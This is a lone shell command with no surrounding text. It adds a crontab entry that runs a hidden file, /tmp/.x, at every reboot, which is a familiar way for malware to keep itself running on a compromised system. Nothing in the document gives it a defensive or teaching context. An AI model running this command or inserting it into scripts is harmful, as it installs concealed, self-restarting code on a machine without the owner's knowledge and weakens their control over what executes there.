crontab -l | { cat; echo "@reboot /tmp/.x"; } | crontab -
